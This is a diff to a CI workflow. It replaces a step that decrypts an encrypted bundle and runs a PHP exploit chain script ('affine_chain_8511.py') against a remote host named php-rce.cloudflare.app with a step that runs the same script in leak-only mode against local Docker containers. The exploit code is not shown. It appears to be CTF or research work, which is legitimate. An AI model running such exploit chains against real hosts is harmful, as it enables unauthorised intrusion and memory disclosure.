@@ -19,13 +19,24 @@ jobs:
     timeout-minutes: 10
     steps:
       - uses: actions/checkout@v4
-      - name: Run Cloudflare PHP CTF chain
+      - name: Validate PHP 8.5.11 layouts locally
         run: |
           openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in cloudflare-ctf.enc -out /tmp/cloudflare-ctf.tar.gz -pass pass:cloudflare-ctf-run
           tar -C /tmp -xzf /tmp/cloudflare-ctf.tar.gz
           cd /tmp/cf-action-bundle
+          docker build -t cf-php-local -f Dockerfile.local .
           set +e
-          python affine_chain_8511.py --target https://php-rce.cloudflare.app --endpoint /php/index.php --verify --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-omnispray-18000-files160.bin --query-order 1234 --leak-length 0x18000 --pipeline-pairs --b1-attempts 5 --b2-attempts 5 > /tmp/cloudflare-proof.log 2>&1
-          status=$?
-          cat /tmp/cloudflare-proof.log
-          exit "$status"
+          docker run -d --name cf-php-baseline -p 18087:80 cf-php-local
+          until curl -fsS http://127.0.0.1:18087/index.php >/dev/null; do sleep 0.2; done
+          python affine_chain_8511.py --target http://127.0.0.1:18087 --endpoint /index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-all-windows-20000-files160.bin --query-order 1234 --leak-length 0x20000 --leak-only --pipeline-pairs > /tmp/baseline.log 2>&1
+          baseline_status=$?
+          docker rm -f cf-php-baseline
+          docker run -d --name cf-php-omnispray -p 18087:80 cf-php-local
+          until curl -fsS http://127.0.0.1:18087/index.php >/dev/null; do sleep 0.2; done
+          python affine_chain_8511.py --target http://127.0.0.1:18087 --endpoint /index.php --warmup warmup.bin --a1 a1-physical-pages-2.bin --b1 b1-omnispray-18000-files160.bin --query-order 1234 --leak-length 0x18000 --leak-only --pipeline-pairs > /tmp/omnispray.log 2>&1
+          omnispray_status=$?
+          docker rm -f cf-php-omnispray
+          echo "BASELINE_STATUS=$baseline_status"
+          cat /tmp/baseline.log
+          echo "OMNISPRAY_STATUS=$omnispray_status"
+          cat /tmp/omnispray.log
